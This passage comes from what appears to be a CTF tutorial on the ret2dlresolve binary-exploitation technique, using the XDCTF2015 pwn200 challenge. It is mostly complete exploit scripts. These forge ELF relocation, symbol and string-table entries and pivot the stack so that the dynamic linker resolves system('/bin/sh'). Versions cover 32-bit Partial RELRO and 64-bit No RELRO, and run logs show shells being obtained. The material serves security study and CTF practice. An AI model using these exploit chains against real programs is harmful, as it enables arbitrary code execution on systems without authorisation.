0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
```

 During the dynamic symbol address resolution process, if version is NULL, the symbol will still be resolved normally.

At the same time, based on the debugging information above, we can see that the hash values in the first two elements of l_versions are both 0. Therefore, if we make ndx equal to 0 or 1, we can satisfy the requirement. Let's find a suitable value below 080487A8. We can see that the content at 0x080487C2 is 0.

Naturally, we can then call the target function.

Here, we can achieve the corresponding goal by adjusting base_stage.

- First, there are (0x080487C2-0x080487A8)/2 version records between 0x080487C2 and 0x080487A8.
- This means the original symbol table offset is short by the corresponding number.
- Therefore, we only need to increase base_stage by (0x080487C2-0x080487A8)/2*0x10 to achieve the corresponding goal.

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

The final result is as follows

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27967
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 5

In this stage, building on stage 4, we will further forge the st_name of the write symbol to point to a string we constructed ourselves.

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())
r.interactive()
```

The result is as follows

```shell
❯ python stage5.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27994
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

In fact, the index_dynsym has changed again here, but it doesn't seem to have any impact, so we don't need to think about forging additional data.

##### stage 6

In this stage, we only need to change the original write string to system, and modify write's arguments to system's arguments to obtain a shell. This is because the `_dl_runtime_resolve` function ultimately resolves the target address based on the function name.

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)/2*0x10
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
st_name = fake_sym_addr + 0x10 - dynstr         # plus 10 since the size of Elf32_Sym is 16.
fake_write_sym = flat([st_name, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

gnu_version_addr = elf.get_section_by_name('.gnu.version').header.sh_addr
print("ndx_addr: %s" % hex(gnu_version_addr+index_dynsym*2))

# construct ropchain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(base_stage + 82)
rop.raw('bbbb')
rop.raw('bbbb')
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('system\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh + '\x00')
rop.raw('a' * (100 - len(rop.chain())))
print rop.dump()
print len(rop.chain())
r.sendline(rop.chain())
r.interactive()
```

Note that here I modified the offset of /bin/sh to base_stage+82, because pwntools aligns strings. As shown in the ropchain below, there are two extra 'a' characters at offset 0x40, which is a bit strange.

```
0x0038:           'syst' 'system\x00'
0x003c:        'em\x00o'
0x0040:             'aa'
0x0042:           'aaaa' 'aaaaaaaaaaaaaa'
```

The result is as follows

```shell
❯ python stage6.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 28204
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487c2
0x0000:        0x8048370
0x0004:           0x25ec
0x0008:           'bbbb' 'bbbb'
0x000c:        0x804a94a
0x0010:           'bbbb' 'bbbb'
0x0014:           'bbbb' 'bbbb'
0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07u\x02\x00'
0x001c:  '\x07u\x02\x00'
0x0020:           'aaaa' 'aaaa'
0x0024:  '\xc0&\x00\x00' '\xc0&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
0x0028: '\x00\x00\x00\x00'
0x002c: '\x00\x00\x00\x00'
0x0030: '\x12\x00\x00\x00'
0x0034:           'syst' 'system\x00'
0x0038:        'em\x00n'
0x003c:             'aa'
0x003e:           'aaaa' 'aaaaaaaaaaaaaaaaaa'
0x0042:           'aaaa'
0x0046:           'aaaa'
0x004a:           'aaaa'
0x004e:           'aaaa'
0x0052:           '/bin' '/bin/sh\x00'
0x0056:        '/sh\x00'
0x005a:           'aaaa' 'aaaaaaaaaa'
0x005e:           'aaaa'
0x0062:           'aaaa'
102
[*] Switching to interactive mode
/bin/sh: 1: aa: not found
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

#### Tool-based Forgery

Based on the introduction above, we should be able to understand this attack.

##### Roputil

Below we directly use roputil to perform the attack. The code is as follows

```python
from roputils import *
from pwn import process
from pwn import gdb
from pwn import context
r = process('./main')
context.log_level = 'debug'
r.recv()

rop = ROP('./main')
offset = 112
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read', 0, bss_base, 100)
## used to call dl_runtimeresolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
r.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
## used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
r.send(buf)
r.interactive()
```

For specific details about dl_resolve_call and dl_resolve_data, please refer to the source code of roputils.py, which is relatively easy to understand. Note that after dl_resolve finishes executing, it also needs a corresponding return address.

The result is as follows

```shell
❯ python roptool.py
[+] Starting local process './main_partial_relro_32': pid 24673
[DEBUG] Received 0x17 bytes:
    'Welcome to XDCTF2015~!\n'
[DEBUG] Sent 0x94 bytes:
    00000000  42 6a 63 57  32 34 75 7a  30 64 6d 71  45 54 50 31  │BjcW│24uz│0dmq│ETP1│
    00000010  42 63 4b 61  4c 76 5a 35  38 77 79 6d  4c 62 34 74  │BcKa│LvZ5│8wym│Lb4t│
    00000020  56 47 4c 57  62 67 55 4b  65 57 4c 64  34 62 6f 47  │VGLW│bgUK│eWLd│4boG│
    00000030  43 47 59 65  4f 41 73 4c  61 35 79 4f  56 47 51 71  │CGYe│OAsL│a5yO│VGQq│
    00000040  59 53 47 69  6e 68 62 35  6f 33 4a 6e  31 77 66 68  │YSGi│nhb5│o3Jn│1wfh│
    00000050  45 6f 38 6b  61 46 46 38  4f 67 6c 62  61 41 58 47  │Eo8k│aFF8│Oglb│aAXG│
    00000060  66 7a 4b 30  63 6d 43 43  74 73 4d 7a  52 66 58 63  │fzK0│cmCC│tsMz│RfXc│
    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
    00000090  40 a0 04 08                                         │@···│
    00000094
[DEBUG] Sent 0x64 bytes:
    00000000  2f 62 69 6e  2f 73 68 00  35 45 4e 50  6e 51 51 4b  │/bin│/sh·│5ENP│nQQK│
    00000010  74 30 57 47  62 55 49 54  54 a0 04 08  07 e9 01 00  │t0WG│bUIT│T···│····│
    00000020  6c 30 39 79  68 4c 58 4b  00 1e 00 00  00 00 00 00  │l09y│hLXK│····│····│
    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 7a  │····│····│syst│em·z│
    00000040  32 45 74 78  75 35 59 6a  55 6b 54 74  63 46 70 71  │2Etx│u5Yj│UkTt│cFpq│
    00000050  32 42 6f 4c  43 53 49 33  75 47 59 53  7a 76 63 6b  │2BoL│CSI3│uGYS│zvck│
    00000060  44 43 4d 41                                         │DCMA│
    00000064
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x9f bytes:
    'exp-pwntools.py        roptool.py    stage2.py\tstage5.py\n'
    'ld-linux.so.2\t       roputils.pyc  stage3.py\tstage6.py\n'
    'main_partial_relro_32  stage1.py     stage4.py\n'
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

##### pwntools

Here we use pwntools tools to perform the attack.

```python
from pwn import *
context.binary = elf = ELF("./main_partial_relro_32")
rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh"])
# pwntools will help us choose a proper addr
# https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
io = process("./main_partial_relro_32")
io.recvuntil("Welcome to XDCTF2015~!\n")
payload = flat({112:raw_rop,256:dlresolve.payload})
io.sendline(payload)
io.interactive()
```

The result is as follows

```shell
❯ python exp-pwntools.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[+] Starting local process './main_partial_relro_32': pid 24688
[*] Switching to interactive mode
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
```

### Full RELRO

When FULL RELRO protection is enabled, the addresses of imported functions in the program are resolved before the program starts executing, so the link_map and dl_runtime_resolve function addresses in the GOT table are not used during program execution. Therefore, both of these addresses in the GOT table are 0. In this case, directly using the techniques above will not work.

Is there any way to bypass such protection? Readers are encouraged to think about this on their own.

## 64-bit Examples

### NO RELRO

In this case, we can construct it directly similar to the 32-bit case. Since the overflow buffer is too small, we can consider performing a stack pivot first, then exploiting the vulnerability.

1. Forge a stack in the bss segment. The data in the stack is
    1. Modify the string table address in the .dynamic section to the forged address
    2. Construct the string table at the forged address, replacing the read string with the system string.
    3. Read the /bin/sh string at a specific position.
    4. Call the second instruction of read's plt, triggering `_dl_runtime_resolve` for function resolution, thereby triggering the execution of the system function.
2. Pivot the stack to the bss segment.

Since there is no gadget in the program that directly sets rdx, we chose the universal gadget here. This makes our ROP chain longer

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
# gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())

# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

Running it directly doesn't work. After debugging, we find the program crashes at 0x7f2512db3e69.

```assembly
 RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
 RBX  0x600d98 ◂— 0x6161616161616161 ('aaaaaaaa')
 RCX  0x7f2512ac3191 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x9
 RDI  0x600b30 (stdout@@GLIBC_2.2.5) ◂— 0x0
 RSI  0x3
 R8   0x50
 R9   0x7f2512faf4c0 ◂— 0x7f2512faf4c0
 R10  0x7f2512fcd170 ◂— 0x0
 R11  0x246
 R12  0x6161616161616161 ('aaaaaaaa')
 R13  0x6161616161616161 ('aaaaaaaa')
 R14  0x6161616161616161 ('aaaaaaaa')
 R15  0x6161616161616161 ('aaaaaaaa')
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
──────[ DISASM ]────────
   0x7f2512db3e52 <_dl_fixup+18>    mov    rdi, qword ptr [rax + 8]
   0x7f2512db3e56 <_dl_fixup+22>    mov    rax, qword ptr [r10 + 0xf8]
   0x7f2512db3e5d <_dl_fixup+29>    mov    rax, qword ptr [rax + 8]
   0x7f2512db3e61 <_dl_fixup+33>    lea    r8, [rax + rdx*8]
   0x7f2512db3e65 <_dl_fixup+37>    mov    rax, qword ptr [r10 + 0x70]
 ► 0x7f2512db3e69 <_dl_fixup+41>    mov    rcx, qword ptr [r8 + 8] <0x7f2512ac3191>
```

Through step-by-step debugging, we find that `_dl_runtime_resolve` saves a large amount of data on the stack

```assembly
.text:00000000000177A0 ; __unwind {
.text:00000000000177A0                 push    rbx
.text:00000000000177A1                 mov     rbx, rsp
.text:00000000000177A4                 and     rsp, 0FFFFFFFFFFFFFFC0h
.text:00000000000177A8                 sub     rsp, cs:qword_227808
.text:00000000000177AF                 mov     [rsp+8+var_8], rax
.text:00000000000177B3                 mov     [rsp+8], rcx
.text:00000000000177B8                 mov     [rsp+8+arg_0], rdx
.text:00000000000177BD                 mov     [rsp+8+arg_8], rsi
.text:00000000000177C2                 mov     [rsp+8+arg_10], rdi
.text:00000000000177C7                 mov     [rsp+8+arg_18], r8
.text:00000000000177CC                 mov     [rsp+8+arg_20], r9
.text:00000000000177D1                 mov     eax, 0EEh
.text:00000000000177D6                 xor     edx, edx
.text:00000000000177D8                 mov     [rsp+8+arg_240], rdx
.text:00000000000177E0                 mov     [rsp+8+arg_248], rdx
.text:00000000000177E8                 mov     [rsp+8+arg_250], rdx
.text:00000000000177F0                 mov     [rsp+8+arg_258], rdx
.text:00000000000177F8                 mov     [rsp+8+arg_260], rdx
.text:0000000000017800                 mov     [rsp+8+arg_268], rdx
.text:0000000000017808                 xsavec  [rsp+8+arg_30]
.text:000000000001780D                 mov     rsi, [rbx+10h]
.text:0000000000017811                 mov     rdi, [rbx+8]
.text:0000000000017815                 call    sub_FE40
```

The value at qword_227808 is 0x0000000000000380.

```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> x/gx 0x7f2512da4000+0x227808
0x7f2512fcb808 <_rtld_global_ro+168>:	0x0000000000000380
```

After executing the following instruction

```assembly
 ► 0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
```

The stack address reaches 0x600a00 (we pivoted the stack to bss_addr+0x100, i.e., 0x600C30), which is in the .dynamic section. Subsequent data saved on the stack will corrupt the content of the .dynamic section, ultimately causing dl_fixup to crash.

```
   0x7f2512dbb7a0 <_dl_runtime_resolve_xsavec>       push   rbx
   0x7f2512dbb7a1 <_dl_runtime_resolve_xsavec+1>     mov    rbx, rsp
   0x7f2512dbb7a4 <_dl_runtime_resolve_xsavec+4>     and    rsp, 0xffffffffffffffc0
   0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808>
 ► 0x7f2512dbb7af <_dl_runtime_resolve_xsavec+15>    mov    qword ptr [rsp], rax <0x600a00>
   0x7f2512dbb7b3 <_dl_runtime_resolve_xsavec+19>    mov    qword ptr [rsp + 8], rcx
   0x7f2512dbb7b8 <_dl_runtime_resolve_xsavec+24>    mov    qword ptr [rsp + 0x10], rdx
   0x7f2512dbb7bd <_dl_runtime_resolve_xsavec+29>    mov    qword ptr [rsp + 0x18], rsi
   0x7f2512dbb7c2 <_dl_runtime_resolve_xsavec+34>    mov    qword ptr [rsp + 0x20], rdi
   0x7f2512dbb7c7 <_dl_runtime_resolve_xsavec+39>    mov    qword ptr [rsp + 0x28], r8
─────────────────────[ STACK ]─────────────────
00:0000│ rsp  0x600a00 (_DYNAMIC+248) ◂— 0x7
01:0008│      0x600a08 (_DYNAMIC+256) ◂— 0x17
02:0010│      0x600a10 (_DYNAMIC+264) —▸ 0x400450 —▸ 0x600b00 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7f2512ac3250 (write) ◂— lea    rax, [rip + 0x2e06a1]
03:0018│      0x600a18 (_DYNAMIC+272) ◂— 0x7
04:0020│      0x600a20 (_DYNAMIC+280) —▸ 0x4003f0 —▸ 0x600ad8 —▸ 0x7f25129d4ab0 (__libc_start_main) ◂— push   r13
05:0028│      0x600a28 (_DYNAMIC+288) ◂— 0x8
06:0030│      0x600a30 (_DYNAMIC+296) ◂— 0x60 /* '`' */
07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* '\t' */
```

Perhaps we could consider pivoting the stack even higher, but the program only has one page of bss-related mapping: 0x600000-0x601000. At the same time

- The bss segment starts at 0x600B30
- The forged stack data totals 392 (0x188) bytes

So directly pivoting the stack to the bss section can easily cause problems.

```assembly
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

But through careful adjustment, we can still avoid corrupting the content of the .dynamic section

- Change the pivoted stack address to bss_addr+0x200, i.e., 0x600d30
- Change the pivoted stack size to 0x188

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x188 # new stack size is 0x188
new_stack = bss_addr+0x200

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
print(len(rop.chain()))
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())


# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

